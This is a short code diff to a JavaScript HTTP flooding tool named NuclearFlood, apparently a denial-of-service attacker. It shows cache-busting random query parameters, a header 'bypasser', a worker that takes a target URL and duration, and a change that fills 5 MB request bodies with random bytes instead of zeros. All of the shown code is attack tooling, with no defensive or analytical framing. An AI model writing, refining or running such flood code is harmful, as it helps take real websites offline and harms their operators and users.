@@ -220,7 +220,7 @@ class NuclearFlood {
             const path = this.url.pathname + (this.url.search ? `${this.url.search}&${generateRandomString(8)}=${Date.now()}` : `?${generateRandomString(8)}=${Date.now()}`);
             const headers = this.bypasser.generateHeaders();
             
-            const randomPayload = crypto.randomBytes(this.largePayload.length);
+            const randomPayload = this.largePayload;
 
             const options = {
                 method: method,
@@ -310,7 +310,7 @@ process.on('message', async ({ targetUrl, duration }) => {
     const l7Delay = 900;
 
     const PAYLOAD_SIZE = 5 * 1024 * 1024;
-    const largePayload = Buffer.alloc(PAYLOAD_SIZE);
+    const largePayload = crypto.randomBytes(PAYLOAD_SIZE);
 
     const bypasser = new BypassGenerator();
 
